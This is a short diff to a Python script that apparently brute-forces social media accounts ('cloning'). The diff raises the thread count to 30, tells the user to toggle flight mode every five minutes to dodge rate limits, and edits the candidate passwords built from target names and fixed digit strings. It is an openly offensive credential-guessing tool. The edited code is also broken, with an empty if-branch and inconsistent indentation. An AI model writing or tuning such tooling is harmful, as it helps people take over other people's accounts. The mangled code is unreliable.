@@ -412,7 +412,7 @@ def passwrd():
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
 	SHANTOj(f'\033[0;97m===============================================')
-	with tred(max_workers=9) as pool:
+	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
@@ -421,15 +421,12 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(nmf)
-					pwv.append('57273200')
+		    		pwv.append('57273200')
 	                pwv.append('57575751')
 	                pwv.append('59039200')	
 			else:
 				if len(frs)<3:
-					pwv.append(nmf)
 				else:
-					pwv.append(nmf)
 					pwv.append('57273200')
 	                pwv.append('57575751')
 	                pwv.append('59039200')
